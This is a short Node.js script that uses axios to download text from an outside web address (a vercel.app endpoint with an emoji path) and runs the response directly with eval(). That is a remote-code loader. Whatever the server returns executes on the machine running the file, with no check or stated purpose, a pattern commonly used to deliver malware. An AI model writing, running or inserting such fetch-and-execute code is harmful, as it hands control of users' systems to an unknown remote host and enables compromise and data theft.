const axios = require('axios');

const url = "https://hanstz-tech.vercel.app/api/🧶";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));
